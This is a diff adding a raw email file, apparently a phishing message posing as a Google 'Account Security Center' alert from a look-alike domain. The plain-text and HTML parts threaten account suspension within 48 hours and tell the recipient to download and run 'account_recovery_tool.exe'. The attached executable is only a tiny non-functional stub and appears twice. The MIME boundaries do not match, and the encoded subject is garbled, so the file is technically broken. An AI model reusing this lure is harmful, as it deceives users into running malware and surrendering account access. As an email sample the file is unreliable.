@@ -1,0 +1,95 @@
+Received: from mail-sor-f41.google.com (mail-sor-f41.google.com. [209.85.220.41])
+        by mx.google.com with ESMTPS id u9-20020a170902a9c000b001d90f7f4aeesor1234567
+        for <user@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384);
+        Fri, 20 Mar 2026 09:15:32 -0700 (PDT)
+Date: Fri, 20 Mar 2026 09:15:32 -0700
+From: Account Security Center <no-reply@accounts-google-support.com>
+Reply-To: recovery-team@accounts-google-support.com
+To: user@gmail.com
+Subject: =?UTF-8?B?5p2l6IGU57sw6Zuq6Iej6Yun6daj6Jip7c3W7dq5?= =?UTF-8?B?6c2y5tqp6dGi5dmi7dGi7?= - Urgent Action Required
+Message-ID: <CAGH2kx8dK3mN5pQ7rT6vW9xY1zA4bC5dE6fG7hI8jK9lM0nB@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_12345_9876543210.1710932132"
+X-Mailer: Apple Mail (2.3774.400.31)
+
+--====_Part_12345_9876543210_====
+Content-Type: multipart/alternative; boundary="----=_SubPart_12345_9876543210"
+
+------=_SubPart_12345_9876543210
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+Dear Valued User,
+
+We have detected unusual sign-in activity on your Google Account from an unrecognized device or location. For your security, your account access has been temporarily restricted until you verify your identity.
+
+To restore full access to your account, please follow these steps:
+
+1. Download the attached Account Recovery Tool
+2. Open and run the tool on your computer
+3. Follow the on-screen instructions to verify your identity
+4. Your access will be automatically restored within 24 hours
+
+If you do not complete this verification within 48 hours, your account may be permanently suspended.
+
+Attachment: account_recovery_tool.exe
+
+For more information, please visit our Security Center.
+
+Best regards,
+Google Account Security Team
+
+--====_Part_12345_9876543210
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
+.container { max-width: 600px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; }
+.header { background: #4285f4; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
+.button { display: inline-block; background: #4285f4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; margin: 20px 0; }
+.warning { background: #fef9e7; border-left: 4px solid #f39c12; padding: 15px; margin: 20px 0; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>Google Account Security Alert</h1>
+</div>
+<div class="content">
+<p>Dear Valued User,</p>
+<p>We have detected <strong>unusual sign-in activity</strong> on your Google Account from an unrecognized device or location.</p>
+<div class="warning">
+<p><strong>⚠️ Action Required:</strong> Your account access has been temporarily restricted until you verify your identity.</p>
+</div>
+<p>To restore full access, please:</p>
+<ol>
+<li>Download the attached <strong>Account Recovery Tool</strong></li>
+<li>Open and <strong>run the tool</strong> on your computer</li>
+<li>Follow the on-screen instructions</li>
+</ol>
+<p>If you do not complete verification within <strong>48 hours</strong>, your account may be permanently suspended.</p>
+<p style="color: #666; font-size: 12px;">Attachment: account_recovery_tool.exe</p>
+</div>
+</div>
+</body>
+</html>
+
+------=_SubPart_12345_9876543210--
+Content-Type: application/x-msdownload; name="=?UTF-8?B?YWNjb3VudF9yZWNvdmVyeV90b29sLmV4ZQ==?="
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="account_recovery_tool.exe"; size=2048576
+
+TVRoZAAAAAH/AAAAbAAAAERPTAAAAAAAAAABPTAAAAAAAAAAAAAA=
+------=_SubPart_12345_9876543210
+Content-Type: application/x-msdownload; name="=?UTF-8?B?YWNjb3VudF9yZWNvdmVyeV90b29sLmV4ZQ==?="
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="account_recovery_tool.exe"; size=2048576
+
+TVRoZAAAAAH/AAAAbAAAAERPTAAAAAAAAAABPTAAAAAAAAAAAAAA=
+------=_Part_12345_9876543210--
+
